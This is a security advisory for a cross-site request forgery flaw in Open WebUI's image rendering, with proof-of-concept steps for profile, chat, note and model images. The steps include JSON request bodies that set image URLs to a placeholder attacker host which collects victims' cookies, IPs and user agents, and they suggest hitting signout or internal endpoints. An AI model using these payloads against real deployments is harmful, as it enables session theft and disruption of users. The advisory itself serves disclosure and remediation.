# [M] Open WebUI Vulnerable to Cross-Site Request Forgery (CSRF) via Image URL Manipulation

## Summary
Severity: Medium
Advisory: GHSA-j6w6-986j-2m2m
CVE: CVE-2026-45317
CWE: CWE-20, CWE-352
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:L (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-j6w6-986j-2m2m
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.3

## Details
## Summary

An application-wide Cross-Site Request Forgery (CSRF) vulnerability was found Open-WebUl's image uploading functionality. An attacker can set an image URL to a malicious endpoint, allowing them to perform actions on behalf of a victim user. Any authenticated user can exploit this vulnerability, and any user who views the compromised image (e.g., a profile picture) will unknowingly send a GET request to the attacker-controlled URL. This can lead to cookie theft, denial of service (DoS), or other malicious actions.



This can be exploited in various locations, including:

• Profile picture

• Model picture

• Hidden images in shared chats

• Images within shared notes

## Details

### Vulnerable Code:
This appears to occur in most locations where images can be uploaded/rendered. Here are found sinks:

**Profile Image in chat**

• Note: rendering profile picture in chat

• Location: https://github.com/open-webui/open-webui/blob/2407d9b905978d68619bdce4021e424046ec8df9/src/lib/components/chat/Messages/ProfileImage.svelte#L16Code

**Profile Picture edit**

• Note: Profile picture rendering in edit

• Location: https://github.com/open-webui/open-webui/blob/2407d9b905978d68619bdce4021e424046ec8df9/src/lib/components/chat/Settings/Account.svelte#L205

**Profile Image Navbar**

• Note: Profile picture rendering in navbar

• Location: https://github.com/open-webui/open-webui/blob/2407d9b905978d68619bdce4021e424046ec8df9/src/lib/components/chat/Navbar.svelte#L237

**Profile Image UserList**

• Note: rendering images in user list admin panel

• Location: https://github.com/open-webui/open-webui/blob/2407d9b905978d68619bdce4021e424046ec8df9/src/lib/components/admin/Users/UserList.svelte#L399

**Images in chat**

• Note: rendering images in chat

• Location: https://github.com/open-webui/open-webui/blob/2407d9b905978d68619bdce4021e424046ec8df9/src/lib/components/common/Image.svelte#L35

**Image in chat**

• Note: Image sent in chat

• Location: https://github.com/open-webui/open-webui/blob/2407d9b905978d68619bdce4021e424046ec8df9/src/lib/components/channel/Messages/Message.svelte#L192
**Model image in chat**

• Note: Model image rendering in chat

• Location: https://github.com/open-webui/open-webui/blob/2407d9b905978d68619bdce4021e424046ec8df9/src/lib/components/chat/Placeholder.svelte#L128

**Model image in chat response**

• Note: Model image rendering in the assistant response

• Location: https://github.com/open-webui/open-webui/blob/2407d9b905978d68619bdce4021e424046ec8df9/src/lib/components/chat/Messages/ResponseMessage.svelte#L612

**Model Image Admin settings**

• Note: Model image rendering in the admin settings

• Location: https://github.com/open-webui/open-webui/blob/2407d9b905978d68619bdce4021e424046ec8df9/src/lib/components/admin/Settings/Models.svelte#L336

**Model Image Workspace**

• Note: Model image rendering in the workspace

• Location: https://github.com/open-webui/open-webui/blob/2407d9b905978d68619bdce4021e424046ec8df9/src/lib/components/workspace/Models.svelte#L336

**Model Image Edit**

• Note: Model image rendering in the edit modal

• Location: https://github.com/open-webui/open-webui/blob/2407d9b905978d68619bdce4021e424046ec8df9/src/lib/components/workspace/Models/ModelEditor.svelte#L407

**Image in Notes**

• Note: Image rendering in shared note

• Location: https://github.com/open-webui/open-webui/blob/2407d9b905978d68619bdce4021e424046ec8df9/src/lib/components/common/RichTextInput/Image/image.ts#L140

• Location: https://github.com/open-webui/open-webui/blob/2407d9b905978d68619bdce4021e424046ec8df9/src/lib/components/chat/Messages/UserMessage.svelte#L184

**Root Cause**

1. Insecure display of image

• Application is sending a GET request to the unvalidated image url

2. Lack of Input Validation

• Image url is not validated for filetype



## PoCs

### PoC (profile picture)

**Environment**

• Open-WebUl latest version (v0.6.41)

• Valid user

**Step 1: Create a Malicious Link**

• Set up a server to obtain victim's cookies, ip, referer, user-agent, etc

**Step 2: Profile Image URL**

1. Add user

1. Change the profile image url parameter to the malicious URL (server was used for PoC)

2. Example POST request:

<img width="1245" height="484" alt="image" src="https://github.com/user-attachments/assets/295f0ab0-fe41-4d50-9c38-cb8c51a3bca2" />


4. Repeat action

    1. Repeat for userSignUp, updateUserProfile, and update

**Step 3: View Image on Victim Admin Account**

1. Log into an admin account

2. Visit the admin panel (/admin/users/overview)

3. Notice the GET request sent to the malicious URL

**Step 4: Verify User Information Is Sent**

1. Confirm user information is sent

<img width="1280" height="677" alt="image" src="https://github.com/user-attachments/assets/cb2f4039-167f-43f4-bd37-ffaf4d476cee" />


### PoC (chat)

**Environment**

• Open-WebUl latest version (v0.6.41)

• Valid user

**Step 1: Create a Malicious Link**

• Set up a server to obtain victim's cookies, ip, referer, use-agent, etc

**Step 2: Start chat**

1. Start chat

1. Send a message

2. Resend POST request

1. Resend post request to this endpoint /api/v1/chats/[chat_id_here]

2. Add in a file with type set to image and the url set to the malicious link

3. Replace models/ids/malicious_url_here with what is applicable

4. {"chat":{"models":["redacted"],"history":{"messages":{"id_here":{"id":"id_here","parentId":"id_here","childrenIds":["id_here"],"role":"user","content":"","files":[{"type":"image","url":"MALICIOUS_URL_HERE"}],"timestamp":1765978991,"models":["redacted"]}}},"params":{},"files":[]}}

<img width="646" height="593" alt="image" src="https://github.com/user-attachments/assets/1273fe2b-3b3b-45dc-9c52-6811f7b18667" />

3. Share chat

    1. Copy link to share the chat

**Step 3: View Image on Victim Account**

1. Log into a valid account

2. Open the shared chat

3. Notice the GET request sent to the malicious URL from the hidden image on the page

<img width="1384" height="500" alt="image" src="https://github.com/user-attachments/assets/bd6e220d-e039-4916-9865-5ce9f0939951" />


**Step 4: Verify User Information Is Sent**

1. Confirm user information is sent

<img width="1480" height="797" alt="image" src="https://github.com/user-attachments/assets/78374c2e-d9c6-476b-944d-1c8230398989" />


### PoC (notes)

**Environment**

• Open WebUI latest version (v0.6.41)

• Valid user with access to notes

**Step 1: Create a Malicious Link**

• Set up a server to obtain victim's cookies, ip, referer, use-agent, etc

**Step 2: Create Note**

1. Resend POST request to /api/v1/notes/[note_id_here]/update

2. Add in the malicious URL to a file

3. Example parameters

    1.  (replace the ID_HERE with valid ID and MALICIOUS_URL_HERE with the malicious URL):

    2. `{"title":"2025-12-17","data":{"files":[{"id":"ID_HERE","type":"image","url":"MALICIOUS_URL_HERE"}]},"access_control":{"read":{"group_ids":[],"user_ids":[]},"write":{"group_ids":[],"user_ids":[]}}}`

<img width="892" height="662" alt="image" src="https://github.com/user-attachments/assets/325a9bfa-2fb3-45be-aeec-e5695085d7d0" />

4. Refresh page and notice the request being sent to the malicious URL

5. Share note and copy link

**Step 5: View Note on Valid Account**

1. Log into a valid account

2. Open the shared note

3. Notice the GET request sent to the malicious URL from the hidden image on the page

<img width="1597" height="317" alt="image" src="https://github.com/user-attachments/assets/767d865b-04a0-42b9-82fc-122acb9cbf16" />

**Step 6: Verify User Information Is Sent**

1. Verify that user information is sent.

<img width="1997" height="860" alt="image" src="https://github.com/user-attachments/assets/b0ecab88-9830-4fb4-ac18-acda9eb44ff7" />

### PoC (model)

**Environment**

• Open WebUI latest version (v0.6.41)

• Admin user

**Step 1: Create a Malicious Link**

• Set up a server to obtain victim's cookies, ip, referer, use-agent, etc

**Step 2: Create Model**

1. Navigate to /workspace/models

2. Create or edit a model

3. Send a POST request to /api/v1/models/create or /api/v1/models/model/update?id=[model_id]

1. Change the profile_image_url to the malicious link

2. Example parameters:

3. `{"id":"model_test","base_model_id":"redacted","name":"MODEL_TEST","meta":{"profile_image_url":"MALICIOUS_URL_HERE","description":null,"suggestion_prompts":null,"tags":[],"capabilities":{"vision":true,"file_upload":true,"web_search":true,"image_generation":true,"code_interpreter":true,"citations":true,"usage":false}},"params":{},"access_control":null}`
<img width="887" height="618" alt="image" src="https://github.com/user-attachments/assets/749dac39-0b9d-4b7e-815d-fd6f3f7c57bd" />


**Step 3: View Image on Valid Account**

1. Log into a valid account

2. Create chat with the model

3. Notice a GET request is sent to the malicious url

4. All users starting a chat with that model will be vulnerable to the attack

<img width="1852" height="468" alt="image" src="https://github.com/user-attachments/assets/ff69c0a2-326d-4b99-9d8c-a73d9aa0deff" />


**Step 4:  View Image on Admin Account**

1. Navigate to /workspace/models

2. Notice GET request sent to malicious url

<img width="1793" height="482" alt="image" src="https://github.com/user-attachments/assets/bda6e687-ccad-4914-a779-281dc67ffcfe" />




**Step 5: Verify User Information Is Sent**

1. On the set up server verify that improperly set cookies are sent, IP, user-agent, etc.

<img width="1687" height="910" alt="image" src="https://github.com/user-attachments/assets/c783ad50-6701-4df8-8beb-ba0957baa2d9" />

### Other Attack Examples

- Alternative malicious links

- Signout of Open WebUI

    - /api/v1/auths/signout

- Internal network endpoints

- Signout of other applications

- Resource intensive endpoints

- Etc


### Recommended Fix

- Store images

   - Instead of sending a GET request to load the image each time, store the image and render on the page

- Validate input

   - Image file types should be whitelisted (examples: .jpg, .png, .gif, .jpeg, etc)


## Impact

### Vulnerability Type

- CWE-352: Cross-Site Request Forgery (CSRF)

- CWE-20: Improper Input Validation

### Affected users

- All authenticated users


The impact of this vulnerability is significant. This application-wide vulnerability allows an attacker to perform actions on behalf of any user who views the compromised image. This can be particularly damaging if an administrator or privileged user views the image, as it could lead to elevated access or sensitive data exposure.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-j6w6-986j-2m2m
- https://nvd.nist.gov/vuln/detail/CVE-2026-45317
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.9.3
